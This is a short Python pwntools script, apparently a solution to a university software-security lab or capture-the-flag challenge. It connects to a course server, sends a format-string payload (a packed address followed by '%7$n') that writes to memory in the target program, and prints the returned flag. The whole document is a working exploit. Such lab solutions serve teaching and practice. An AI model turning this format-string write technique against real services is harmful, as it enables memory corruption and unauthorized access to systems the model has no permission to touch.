from pwn import remote, p32

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 23193

remote = remote(SERVER, PORT, timeout=10000)

buffer = p32(0x804c040) + b"%7$n"

remote.sendline(buffer)
flag = remote.recvline_contains(b"SSof")
print(flag.decode())